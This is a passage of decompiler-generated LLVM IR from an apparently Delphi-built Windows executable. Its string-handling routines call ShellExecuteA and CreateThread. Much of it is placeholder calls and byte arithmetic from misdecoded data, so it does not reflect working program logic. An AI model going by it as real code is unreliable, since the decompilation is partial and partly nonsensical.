  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1472
  %26 = call i32 @"@LStrClr"(), !insn.addr !1473
  ret i32 %26, !insn.addr !1474
}

define i32 @function_4066d4() local_unnamed_addr {
dec_label_pc_4066d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1475
  ret i32 %0, !insn.addr !1475
}

define i32 @function_4066d9() local_unnamed_addr {
dec_label_pc_4066d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1476
}

define i32 @function_4066db(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4066db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1477
}

define i32 @function_4066e4() local_unnamed_addr {
dec_label_pc_4066e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1478
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1479
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1480
  ret i32 %4, !insn.addr !1481
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1482
  %esp.0.reg2mem = alloca i32, !insn.addr !1482
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1482
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1483
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1483
  br label %dec_label_pc_406724, !insn.addr !1483

dec_label_pc_406724:                              ; preds = %dec_label_pc_406724, %dec_label_pc_40671c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1484
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1484
  store i32 0, i32* %2, align 4, !insn.addr !1484
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1485
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1485
  store i32 0, i32* %4, align 4, !insn.addr !1485
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1486
  %6 = icmp eq i32 %5, 0, !insn.addr !1486
  %7 = icmp eq i1 %6, false, !insn.addr !1487
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1487
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1487
  br i1 %7, label %dec_label_pc_406724, label %dec_label_pc_40672b, !insn.addr !1487

dec_label_pc_40672b:                              ; preds = %dec_label_pc_406724
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1488
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1488
  store i32 0, i32* %9, align 4, !insn.addr !1488
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1489
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1489
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1490
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1490
  store i32 %0, i32* %13, align 4, !insn.addr !1490
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1491
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1491
  store i32 4221027, i32* %15, align 4, !insn.addr !1491
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1492
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1492
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1492
  store i32 %16, i32* %18, align 4, !insn.addr !1492
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1493
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1494
  %20 = call i32 @function_406648(), !insn.addr !1495
  %21 = call i32 @function_4036f4(), !insn.addr !1496
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1497
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1498
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1498
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1498
  store i32 %25, i32* %24, align 4, !insn.addr !1498
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1499
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1500
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1501
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1501
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1501
  store i32 %30, i32* %29, align 4, !insn.addr !1501
  %31 = call i32 @function_4034f4(), !insn.addr !1502
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1503
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1504
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1504
  store i32 ptrtoint ([6 x i8]* @global_var_406878 to i32), i32* %34, align 4, !insn.addr !1504
  %35 = call i32 @function_4066e4(), !insn.addr !1505
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1506
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1506
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1507
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1507
  store i32 ptrtoint (i32* @global_var_406888 to i32), i32* %39, align 4, !insn.addr !1507
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1508
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1508
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1508
  store i32 %40, i32* %42, align 4, !insn.addr !1508
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1509
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1510
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1510
  store i32 0, i32* %45, align 4, !insn.addr !1510
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1511
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1511
  store i32 0, i32* %47, align 4, !insn.addr !1511
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1512
  %49 = call i32 @function_4036f4(), !insn.addr !1513
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1514
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1514
  store i32 %49, i32* %51, align 4, !insn.addr !1514
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1515
  %53 = call i32 @function_406648(), !insn.addr !1516
  %54 = call i32 @function_4036f4(), !insn.addr !1517
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1518
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1518
  store i32 %54, i32* %56, align 4, !insn.addr !1518
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1519
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1519
  store i32 0, i32* %58, align 4, !insn.addr !1519
  %59 = call i32 @function_406640(), !insn.addr !1520
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1521
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1521
  store i32 1, i32* %61, align 4, !insn.addr !1521
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1522
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1522
  store i32 0, i32* %63, align 4, !insn.addr !1522
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1523
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1523
  store i32 0, i32* %65, align 4, !insn.addr !1523
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1524
  %67 = call i32 @function_4036f4(), !insn.addr !1525
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1526
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1526
  store i32 %67, i32* %69, align 4, !insn.addr !1526
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1527
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1527
  store i32 ptrtoint ([5 x i8]* @global_var_406898 to i32), i32* %71, align 4, !insn.addr !1527
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1528
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1528
  store i32 0, i32* %73, align 4, !insn.addr !1528
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1529
  %75 = load i32, i32* %73, align 4, !insn.addr !1530
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1531
  store i32 4221034, i32* %69, align 4, !insn.addr !1532
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1533
  ret i32 %76, !insn.addr !1534
}

define i32 @function_406863() local_unnamed_addr {
dec_label_pc_406863:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1535
  ret i32 %0, !insn.addr !1535
}

define i32 @function_406868() local_unnamed_addr {
dec_label_pc_406868:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1536
}

define i32 @function_40686a(i32 %arg1) local_unnamed_addr {
dec_label_pc_40686a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1537
}

define i32 @function_40688f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40688f:
  %esp.1.reg2mem = alloca i32, !insn.addr !1538
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1538
  %ecx.0.reg2mem = alloca i32, !insn.addr !1538
  %esp.0.reg2mem = alloca i32, !insn.addr !1538
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1538
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1538
  store i32 %5, i32* %6, align 4, !insn.addr !1538
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1539
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1539
  %11 = add i8 %8, %10, !insn.addr !1539
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1539
  store i8 %11, i8* %12, align 1, !insn.addr !1539
  %13 = add i32 %2, 58, !insn.addr !1540
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1540
  %15 = load i8, i8* %14, align 1, !insn.addr !1540
  %16 = load i32, i32* %eax, align 4, !insn.addr !1540
  %17 = udiv i32 %16, 256, !insn.addr !1540
  %18 = trunc i32 %17 to i8, !insn.addr !1540
  %19 = add i8 %15, %18, !insn.addr !1540
  store i8 %19, i8* %14, align 1, !insn.addr !1540
  %20 = add i32 %0, 112, !insn.addr !1541
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1541
  %22 = load i8, i8* %21, align 1, !insn.addr !1541
  %23 = trunc i32 %4 to i8, !insn.addr !1541
  %24 = add i8 %22, %23, !insn.addr !1541
  store i8 %24, i8* %21, align 1, !insn.addr !1541
  %25 = trunc i32 %3 to i16, !insn.addr !1542
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1542
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1542
  %27 = load i8, i8* %7, align 4, !insn.addr !1543
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1543
  %30 = add i8 %27, %29, !insn.addr !1543
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1543
  store i8 %30, i8* %31, align 1, !insn.addr !1543
  %32 = load i8, i8* %7, align 4, !insn.addr !1544
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1544
  %35 = add i8 %32, %34, !insn.addr !1544
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1544
  store i8 %35, i8* %36, align 1, !insn.addr !1544
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1545
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1546
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1546
  br label %dec_label_pc_4068a8, !insn.addr !1546

dec_label_pc_4068a8:                              ; preds = %dec_label_pc_4068a8, %dec_label_pc_40688f
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1547
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1547
  store i32 0, i32* %39, align 4, !insn.addr !1547
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1548
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1548
  store i32 0, i32* %41, align 4, !insn.addr !1548
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1549
  %43 = icmp eq i32 %42, 0, !insn.addr !1549
  %44 = icmp eq i1 %43, false, !insn.addr !1550
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1550
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1550
  br i1 %44, label %dec_label_pc_4068a8, label %dec_label_pc_4068af, !insn.addr !1550

dec_label_pc_4068af:                              ; preds = %dec_label_pc_4068a8
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1551
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1551
  store i32 0, i32* %46, align 4, !insn.addr !1551
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1552
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1552
  store i32 %37, i32* %48, align 4, !insn.addr !1552
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1553
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1553
  store i32 4221764, i32* %50, align 4, !insn.addr !1553
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1554
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1554
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1554
  store i32 %51, i32* %53, align 4, !insn.addr !1554
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1555
  %54 = call i32 @"@LStrPos"(), !insn.addr !1556
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1557
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1557
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1557
  store i32 %57, i32* %56, align 4, !insn.addr !1557
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1558
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1559
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1559
  store i32 %61, i32* %60, align 4, !insn.addr !1559
  %62 = call i32 @function_4034f4(), !insn.addr !1560
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1561
  %64 = add i32 %arg1, -1, !insn.addr !1562
  store i32 %64, i32* %eax, align 4, !insn.addr !1562
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406b29 [
    i32 0, label %dec_label_pc_406921
    i32 1, label %dec_label_pc_406a61
    i32 2, label %dec_label_pc_406acf
  ]

dec_label_pc_406921:                              ; preds = %dec_label_pc_4068af
  %65 = call i32 @function_4034f4(), !insn.addr !1563
  %66 = icmp slt i32 %65, 5, !insn.addr !1564
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1564
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1564
  br i1 %66, label %dec_label_pc_406b29, label %dec_label_pc_406932, !insn.addr !1564

dec_label_pc_406932:                              ; preds = %dec_label_pc_406921
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1565
  %68 = call i32 @function_406648(), !insn.addr !1566
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1567
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1567
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1568
  %72 = call i32 @function_406648(), !insn.addr !1569
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1570
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1570
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1571
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1571
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1571
  store i32 %75, i32* %77, align 4, !insn.addr !1571
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1572
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1572
  store i32 ptrtoint (i32* @global_var_406b68 to i32), i32* %79, align 4, !insn.addr !1572
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1573
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1573
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1573
  store i32 %80, i32* %82, align 4, !insn.addr !1573
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1574
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1575
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1575
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1576
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1576
  store i32 4221812, i32* %87, align 4, !insn.addr !1576
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1577
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1577
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1577
  store i32 %88, i32* %90, align 4, !insn.addr !1577
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1578
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1578
  store i32 4221828, i32* %92, align 4, !insn.addr !1578
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1579
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1579
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1579
  store i32 %93, i32* %95, align 4, !insn.addr !1579
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1580
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1580
  store i32 4221844, i32* %97, align 4, !insn.addr !1580
  %98 = call i32 @function_4079ec(), !insn.addr !1581
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1582
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1582
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1583
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1584
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1584
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1585
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1585
  store i32 %106, i32* %105, align 4, !insn.addr !1585
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1586
  %108 = call i32 @function_406648(), !insn.addr !1587
  %109 = call i32 @"@LStrPos"(), !insn.addr !1588
  %110 = add i32 %109, -1, !insn.addr !1589
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1590
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1590
  store i32 %110, i32* %112, align 4, !insn.addr !1590
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1591
  %114 = call i32 @function_406648(), !insn.addr !1592
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1593
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1594
  store i32 %116, i32* %112, align 4, !insn.addr !1595
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1596
  %118 = call i32 @function_406648(), !insn.addr !1597
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1598
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1598
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1599
  %122 = call i32 @function_406648(), !insn.addr !1600
  %123 = call i32 @function_405d28(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1601
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1602
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1602
  br label %dec_label_pc_406b29, !insn.addr !1602

dec_label_pc_406a61:                              ; preds = %dec_label_pc_4068af
  %124 = call i32 @function_4034f4(), !insn.addr !1603
  %125 = icmp slt i32 %124, 5, !insn.addr !1604
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1604
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1604
  br i1 %125, label %dec_label_pc_406b29, label %dec_label_pc_406a72, !insn.addr !1604

dec_label_pc_406a72:                              ; preds = %dec_label_pc_406a61
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1605
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1605
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %127, align 4, !insn.addr !1605
  %128 = call i32 @function_405078(), !insn.addr !1606
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1607
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1607
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1608
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1608
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %132, align 4, !insn.addr !1608
  %133 = call i32 @function_405078(), !insn.addr !1609
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1610
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1611
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1612
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1612
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1613
  %140 = call i32 @function_406648(), !insn.addr !1614
  %141 = call i32 @function_4051d0(), !insn.addr !1615
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1616
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1616
  br label %dec_label_pc_406b29, !insn.addr !1616

dec_label_pc_406acf:                              ; preds = %dec_label_pc_4068af
  %142 = call i32 @function_4034f4(), !insn.addr !1617
  %143 = icmp slt i32 %142, 5, !insn.addr !1618
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1618
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1618
  br i1 %143, label %dec_label_pc_406b29, label %dec_label_pc_406adc, !insn.addr !1618

dec_label_pc_406adc:                              ; preds = %dec_label_pc_406acf
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1619
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1619
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %145, align 4, !insn.addr !1619
  %146 = call i32 @function_405078(), !insn.addr !1620
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1621
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1621
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1622
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1622
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %150, align 4, !insn.addr !1622
  %151 = call i32 @function_405078(), !insn.addr !1623
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1624
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1625
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1626
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1626
  %157 = call i32 @function_406648(), !insn.addr !1627
  %158 = call i32 @function_4051d0(), !insn.addr !1628
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1628
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1628
  br label %dec_label_pc_406b29, !insn.addr !1628

dec_label_pc_406b29:                              ; preds = %dec_label_pc_4068af, %dec_label_pc_406adc, %dec_label_pc_406acf, %dec_label_pc_406a72, %dec_label_pc_406a61, %dec_label_pc_406932, %dec_label_pc_406921
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1629
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1629
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1630
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1631
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1632
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1632
  store i32 4221771, i32* %163, align 4, !insn.addr !1632
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1633
  ret i32 %164, !insn.addr !1634
}

define i32 @function_406b44() local_unnamed_addr {
dec_label_pc_406b44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1635
  ret i32 %0, !insn.addr !1635
}

define i32 @function_406b49() local_unnamed_addr {
dec_label_pc_406b49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1636
}

define i32 @function_406b4b(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1637
}

define i32 @function_406b77() local_unnamed_addr {
dec_label_pc_406b77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1638
}

define i32 @function_406b7f() local_unnamed_addr {
dec_label_pc_406b7f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1639
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1639
  store i32 %1, i32* %2, align 4, !insn.addr !1639
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1640
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1640
  %7 = add i8 %4, %6, !insn.addr !1640
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1640
  store i8 %7, i8* %8, align 1, !insn.addr !1640
  %9 = load i8, i8* %3, align 4, !insn.addr !1641
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1641
  %12 = trunc i32 %11 to i8, !insn.addr !1641
  %13 = add i8 %9, %12, !insn.addr !1641
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1641
  store i8 %13, i8* %14, align 1, !insn.addr !1641
  %15 = load i32, i32* %eax, align 4, !insn.addr !1642
  ret i32 %15, !insn.addr !1642
}

define i32 @function_406b86() local_unnamed_addr {
dec_label_pc_406b86:
  %0 = call i32 @function_406bc4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1643
  ret i32 %0, !insn.addr !1643
}

define i32 @function_406bc2() local_unnamed_addr {
dec_label_pc_406bc2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1644
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1644
  store i8 %2, i8* %3, align 1, !insn.addr !1644
  ret i32 %0, !insn.addr !1644
}

define i32 @function_406bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_406bc4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406c28, label %dec_label_pc_406bc7, !insn.addr !1645

dec_label_pc_406bc7:                              ; preds = %dec_label_pc_406bc4
  %5 = icmp eq i1 %4, false, !insn.addr !1646
  br i1 %5, label %dec_label_pc_406c3c, label %dec_label_pc_406bc9, !insn.addr !1646

dec_label_pc_406bc9:                              ; preds = %dec_label_pc_406bc7
  ret i32 %2, !insn.addr !1647

dec_label_pc_406c28:                              ; preds = %dec_label_pc_406bc4
  %6 = call i32 @function_4045d8(), !insn.addr !1648
  br label %dec_label_pc_406c3c, !insn.addr !1649

dec_label_pc_406c3c:                              ; preds = %dec_label_pc_406c28, %dec_label_pc_406bc7
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1650
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 0, i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1651
  %9 = add i32 %0, 20, !insn.addr !1652
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1652
  %11 = load i32, i32* %10, align 4, !insn.addr !1652
  %12 = add i32 %0, 16, !insn.addr !1653
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1653
  %14 = load i32, i32* %13, align 4, !insn.addr !1653
  %15 = add i32 %0, 8, !insn.addr !1654
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1654
  %17 = load i32, i32* %16, align 4, !insn.addr !1654
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1655
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1655
  ret i32 %19, !insn.addr !1656
}

define i32 @function_406c74() local_unnamed_addr {
dec_label_pc_406c74:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
